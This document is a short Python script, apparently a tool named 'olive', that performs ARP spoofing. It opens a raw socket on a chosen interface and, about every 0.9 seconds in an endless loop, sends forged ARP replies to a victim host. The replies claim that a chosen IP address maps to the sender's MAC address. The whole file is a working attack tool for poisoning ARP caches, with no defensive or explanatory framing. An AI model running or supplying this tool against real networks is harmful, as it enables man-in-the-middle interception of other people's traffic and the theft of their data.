#!/usr/bin/env python3



from sys import argv
from socket import *
from uuid import getnode
from time import sleep



template = '{}{}08060001080006040002{}{}{}{}'



def xip(address):
  return inet_aton(address).hex()



def xmac(address):
  return address.lower().replace(':', '')



def self_mac():
  return hex(getnode())[2:]



def send_reply(socket, sha, spa, tha, tpa):
  return socket.send(bytes.fromhex(template.format(tha, sha, sha, spa, tha, tpa)))



def bind(iface):
  sock = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW)
  sock.bind((iface, 0))

  return sock



def start(iface, spa, tpa, tha):
  sock = bind(iface)
  i = 1

  print('started\n')

  while 1:
    sleep(0.9)

    send_reply(sock, self_mac(), spa, tha, tpa)
    print(f'[+] sent frame {i}')
    i += 1



def usage():
  print('usage: olive <iface> <fake ip> <user ip>')



def main():
  if len(argv) != 4:
    usage()

  else:
    try:
      iface = argv[1]
      spa = xip(argv[2])
      sha = self_mac()
      tpa = xip(argv[3])

      tha = xmac(input('user mac: '))
      start(iface, spa, tpa, tha)

    except:
      print('stopped\n')



if __name__ == '__main__':
  main()